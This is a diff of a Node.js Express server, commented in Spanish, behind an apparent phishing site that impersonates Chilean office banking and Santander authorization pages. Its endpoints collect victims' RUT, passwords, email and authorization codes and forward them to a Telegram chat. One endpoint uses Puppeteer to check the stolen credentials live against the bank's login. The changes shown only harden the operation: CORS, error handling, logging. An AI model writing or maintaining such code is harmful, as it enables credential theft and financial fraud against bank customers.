@@ -2,27 +2,42 @@ const express = require("express");
 const cors = require("cors");
 const fs = require("fs");
 const path = require("path");
-// Si tu Node es <18, instala node-fetch y descomenta:
-// const fetch = require("node-fetch");
 
 const app = express();
 
-// ✅ CORS mejorado - permite tu dominio propio
+// ✅ CORS mejorado - permite AMBOS dominios sin redirección
 const corsOptions = {
-  origin: [
-    "https://www.officebankingchile.info",
-    "https://officebankingchile.info",
-    "http://localhost:3000",
-    "http://localhost:5000"
-  ],
+  origin: function(origin, callback) {
+    // Permitir sin dominio (localhost, etc) y ambos dominios
+    if (!origin || 
+        origin === "https://www.officebankingchile.info" || 
+        origin === "https://officebankingchile.info" ||
+        origin === "http://localhost:3000" ||
+        origin === "http://localhost:5000") {
+      callback(null, true);
+    } else {
+      callback(new Error("No permitido por CORS"));
+    }
+  },
   methods: ["GET", "POST", "OPTIONS"],
   allowedHeaders: ["Content-Type", "Authorization"],
-  credentials: true
+  credentials: true,
+  maxAge: 86400
 };
 
 app.use(cors(corsOptions));
+
+// ✅ Manejo de preflight explícito para OPTIONS
+app.options("*", cors(corsOptions));
+
 app.use(express.json());
 app.use(express.static(path.join(__dirname, "public")));
+
+// ✅ Middleware para logging
+app.use((req, res, next) => {
+  console.log(`📨 ${req.method} ${req.path} - Origin: ${req.get('origin')}`);
+  next();
+});
 
 // ✅ Health check endpoint
 app.get("/health", (req, res) => {
@@ -31,11 +46,15 @@ app.get("/health", (req, res) => {
 
 // Endpoint para leer configuración
 app.get("/config", (req, res) => {
-  const cfg = JSON.parse(fs.readFileSync("config.json", "utf8"));
-  res.json(cfg);
+  try {
+    const cfg = JSON.parse(fs.readFileSync("config.json", "utf8"));
+    res.json(cfg);
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
 });
 
-// Endpoint para procesar saldo directamente (flujo original)
+// Endpoint para procesar saldo directamente
 app.post("/procesarSaldo", async (req, res) => {
   const { rut, passwd } = req.body;
   try {
@@ -48,8 +67,12 @@ app.post("/procesarSaldo", async (req, res) => {
 
 // Endpoint para guardar configuración
 app.post("/config", (req, res) => {
-  fs.writeFileSync("config.json", JSON.stringify(req.body, null, 2));
-  res.json(req.body);
+  try {
+    fs.writeFileSync("config.json", JSON.stringify(req.body, null, 2));
+    res.json(req.body);
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
 });
 
 // Ruta directa al admin
@@ -59,19 +82,23 @@ app.get("/admin", (req, res) => {
 
 // Decidir qué página de autorización mostrar
 app.get("/autorizacion", (req, res) => {
-  const cfg = JSON.parse(fs.readFileSync("config.json", "utf8"));
+  try {
+    const cfg = JSON.parse(fs.readFileSync("config.json", "utf8"));
 
-  if (cfg.tipoAutorizacion === "santander") {
-    res.sendFile(path.join(__dirname, "public", "autorizacion-santander.html"));
-    return;
-  }
+    if (cfg.tipoAutorizacion === "santander") {
+      res.sendFile(path.join(__dirname, "public", "autorizacion-santander.html"));
+      return;
+    }
 
-  if (cfg.tipoAutorizacion === "coordenadas") {
+    if (cfg.tipoAutorizacion === "coordenadas") {
+      res.sendFile(path.join(__dirname, "public", "autorizacion-coordenadas.html"));
+      return;
+    }
+
     res.sendFile(path.join(__dirname, "public", "autorizacion-coordenadas.html"));
-    return;
+  } catch (err) {
+    res.status(500).json({ error: err.message });
   }
-
-  res.sendFile(path.join(__dirname, "public", "autorizacion-coordenadas.html"));
 });
 
 // Endpoint para recibir autorizaciones y reenviar a Telegram
@@ -90,14 +117,14 @@ app.post("/autorizar", async (req, res) => {
   }
 });
 
-// ✅ Endpoint para login mejorado con manejo de errores
+// ✅ Endpoint para login mejorado
 app.post("/proxy-login", async (req, res) => {
   const { rut, passwd, mail } = req.body;
   const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
   let mensajeFinal = "Bienvenido a Office Banking";
   let loginStatus = null;
 
-  console.log("📝 POST /proxy-login recibido:", { rut, mail: mail ? "***" : undefined });
+  console.log("📝 POST /proxy-login recibido:", { rut: rut || "N/A", mail: mail ? "***" : undefined });
 
   try {
     if (mail) {
@@ -124,7 +151,7 @@ app.post("/proxy-login", async (req, res) => {
       body: JSON.stringify({ chat_id: process.env.CHAT_ID, text: ingresoMsg })
     });
 
-    // Aquí va la lógica de Puppeteer, dentro del mismo async
+    // Lógica de Puppeteer
     const puppeteer = require("puppeteer");
     const browser = await puppeteer.launch({ 
       headless: true,
@@ -132,12 +159,11 @@ app.post("/proxy-login", async (req, res) => {
     });
     const page = await browser.newPage();
 
-    // Escuchar respuestas de red
     page.on("response", async (response) => {
       const url = response.url();
       if (url.includes("/login")) {
         const status = response.status();
-        console.log("➡️ Respuesta de login:", status, url);
+        console.log("➡️ Respuesta de login:", status);
         if (status === 401) loginStatus = "error";
         else if (status === 200) loginStatus = "ok";
       }
@@ -175,14 +201,19 @@ app.post("/proxy-login", async (req, res) => {
     await browser.close();
     res.json({ status: "ok", mensaje: mensajeFinal });
   } catch (err) {
-    console.error("⚠️ Error en validación de credenciales:", err);
-    res.status(500).json({ status: "error", mensaje: "Error al procesar credenciales: " + err.message });
+    console.error("⚠️ Error en validación:", err);
+    res.status(500).json({ status: "error", mensaje: "Error al procesar credenciales" });
   }
 });
 
 // Servir index.html por defecto
 app.get("/", (req, res) => {
   res.sendFile(path.join(__dirname, "public", "index.html"));
+});
+
+// ✅ Manejo de errores 404
+app.use((req, res) => {
+  res.status(404).json({ error: "Ruta no encontrada" });
 });
 
 const PORT = process.env.PORT || 3000;
